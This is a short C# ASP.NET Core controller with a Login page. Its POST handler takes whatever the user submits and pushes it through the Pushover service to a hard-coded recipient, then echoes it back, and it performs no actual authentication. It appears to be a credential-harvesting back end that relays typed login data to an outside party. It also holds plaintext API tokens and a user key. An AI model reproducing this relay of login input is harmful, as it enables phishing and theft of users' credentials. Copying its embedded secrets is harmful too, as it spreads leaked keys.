using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using WebApplication7.Models;
using PushoverClient;

namespace WebApplication7.Controllers
{
    public class HomeController : Controller
    {
        [HttpGet]
        public IActionResult Login()
        {
  
            return View();
        }
       
        [HttpPost]
        public IActionResult Login(string text)
        {
            string authData = $"text: {text}";
            Push(authData);
            return Content(authData);
            void Push(string text1)
            {
                Pushover pclient = new Pushover("ardn8cprtqmfsdq2695akxer2tf3qh");

                PushResponse response = pclient.Push(
                    "Dfyz1996",
                    text1,
                    "uddsza9d975v9njw5rxabvg3wr92gc");


            }
        }
   
    }

}
